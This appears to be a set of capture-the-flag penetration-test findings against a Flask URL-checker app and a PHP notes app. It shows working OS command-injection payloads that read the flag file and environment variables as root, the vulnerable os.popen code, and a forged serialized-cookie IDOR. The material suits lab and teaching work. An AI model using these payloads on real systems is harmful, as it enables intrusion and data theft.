findings.title: Command Injection in SiteSaver URL Validator
findings.description: The SiteSaver application (Python/Werkzeug on port 59635) validates URLs by passing them to a shell command (likely curl) without sanitization. The URL parameter is directly concatenated into a shell command, allowing command injection. The output of injected commands is reflected in the JSON response's 'message' field, enabling blind-to-reflected command injection.
findings.evidence:
FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}

Exploit:
POST /add_url HTTP/1.1
Host: 172.17.0.1:59635
Content-Type: application/x-www-form-urlencoded

url=http://example.com"; cat /app/flag.txt #

Response:
{"message": "URL status was checked and returned 200FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2} status", "success": true}

Additional recon:
- ls / shows /app directory
- ls /app shows: Dockerfile, app.py, flag.txt, instance, requirements.txt, templates
- /app/flag.txt contains the flag

reproduction.expected: Flag in message field of JSON response

findings.title: PHP Insecure Deserialization IDOR - View Any User's Notes
findings.description: The PHP notes application uses insecure deserialization to manage user sessions. The 'data' cookie contains a base64-encoded PHP serialized UserProfile object. The userid property in this object controls which user's notes are displayed, with no server-side validation of ownership. An attacker can change the userid to any integer to view another user's private notes (IDOR).
findings.evidence:
Normal admin access (userid=1):
Cookie: data=TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==
Decodes to: O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}

Admin notes exposed:
- Flag: My Secret Flag
- ToDo: Test web app security.

Additional behavior: Extra properties in UserProfile trigger 'show all notes' code path, exposing all users' notes.

findings.title: SiteSaver RCE as Root - Post-Exploitation Summary
findings.description: The SiteSaver Flask application runs as root (uid=0). Command injection via the URL parameter allows full OS command execution as root. The CTF flag is accessible both as a file at /app/flag.txt and as an environment variable FLAG.

findings.title: Hardcoded Flask Secret Key in SiteSaver Application
findings.description: The SiteSaver Flask application uses a hardcoded secret key 'YourSecretKey' in app.py. This key is used to sign session cookies and CSRF tokens. An attacker who knows this key can forge arbitrary Flask session cookies, potentially impersonating any user or escalating privileges within the application.
findings.tool_used: OS command injection / source code read

findings.title: OS Command Injection — RCE as Root in SiteSaver (CVE-class)
findings.description: The SiteSaver Flask application passes user-supplied URL input directly into a shell command via os.popen() without any sanitization. An unauthenticated attacker can inject arbitrary OS commands by terminating the curl argument with a double-quote and appending commands, commented with '#'. The application runs as root (uid=0) inside a Docker container, granting complete container compromise.
findings.evidence:
Vulnerable code: command = f'curl -o /dev/null -s -w "%{http_code}" "{url}"'
Exploit: POST /add_url url=http://example.com"; cat /app/flag.txt #
Output: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}
uid=0(root) gid=0(root) groups=0(root)

reproduction.command:
POST http://172.17.0.1:59635/add_url
Content-Type: application/x-www-form-urlencoded

url=http://example.com"; id #
reproduction.expected: uid=0(root) gid=0(root) groups=0(root) in response message

findings.title: OS Command Injection + Output Reflection → Flag Extraction
findings.description: The SiteSaver app validates URLs by passing them directly into a shell command via `os.popen(f'curl -o /dev/null -s -w "%{http_code}" "{url}"')` with no sanitization. The full stdout (status code + any injected command output) is reflected in the JSON `message` field since the check is `if '200' in response`. By injecting shell commands after a `"` character, arbitrary commands are executed and their output is readable in the response.
findings.evidence:
Injection: `url=http://example.com"; cat /app/flag.txt 2>&1; env | grep -i flag 2>&1 #`

Response message: 'URL status was checked and returned 200FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}FLAG=FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}'

FLAG: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}

Vulnerable code in /app/app.py:
```python
def check_url(url):
    # Vulnerable to OS Command Injection
    command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'
    with os.popen(command) as output:
        response = output.read().strip()
    return response
```

The check `if '200' in response:` allows injection output to appear alongside the status code, and the message template `f'URL status was checked and returned {response} status'` reflects the full stdout.
